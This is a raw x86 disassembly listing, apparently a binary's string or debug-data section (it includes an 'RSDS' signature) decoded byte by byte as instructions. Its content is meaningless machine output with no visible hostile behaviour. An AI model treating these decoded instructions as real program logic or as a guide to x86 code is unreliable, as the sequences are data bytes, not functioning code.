  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	out    0xd0,al
  42ab5a:	fidivr WORD PTR [ecx+0x43ca06c6]
  42ab60:	cdq    
  42ab61:	xchg   esi,eax
  42ab62:	jnp    0x42ab9c
  42ab64:	sub    ebp,DWORD PTR [edi]
  42ab66:	add    dl,BYTE PTR [esp+ebx*1]
  42ab69:	add    BYTE PTR [eax],al
  42ab6b:	add    BYTE PTR [ecx+0x3a],dl
  42ab6e:	pop    esp
  42ab6f:	outs   dx,DWORD PTR ds:[esi]
  42ab70:	push   ecx
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
